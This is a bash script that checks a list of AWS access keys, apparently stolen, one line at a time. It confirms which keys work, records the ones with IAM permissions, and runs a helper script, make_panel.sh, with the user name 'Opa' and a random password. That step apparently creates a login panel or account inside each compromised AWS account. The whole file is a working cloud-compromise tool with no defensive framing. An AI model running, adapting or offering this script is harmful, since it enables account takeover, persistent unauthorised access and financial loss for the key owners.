#!/bin/bash

LC_CTYPE=C

for i in $(tac $1); do
    export AWS_ACCESS_KEY_ID=$(echo -n "$i" | cut -d':' -f1)
    export AWS_SECRET_ACCESS_KEY=$(echo -n "$i" | cut -d':' -f2)
    export AWS_DEFAULT_REGION=$(if [ -z `echo -n "$i" | cut -d ':' -f3` ]; then echo -n "us-east-1"; else echo -n "$i" | cut -d ':' -f3; fi)
    aws sts get-caller-identity > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} is valid."
    echo "$i" >> panel/aws_valid.txt
        echo -e "\e[33m[INFO]\e[39m checking for iam permissions..."
        aws iam list-users > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} has iam permissions ! :)"
            echo -e "${i}" >> panel/aws_perms_panel.txt
            echo -e "\e[33m[INFO]\e[39m creating panel..."
            bash make_panel.sh "Opa" "$(cat /dev/urandom 2>/dev/null | tr -dc '_\-/\\^$A-Za-z0-9' 2>/dev/null | head -c12 2>/dev/null)" "${AWS_ACCESS_KEY_ID}" "${AWS_SECRET_ACCESS_KEY}" "${AWS_DEFAULT_REGION}"
        else
            echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} has not iam permissions. :("
        fi
    else
        echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} is invalid."
    fi
    echo
done
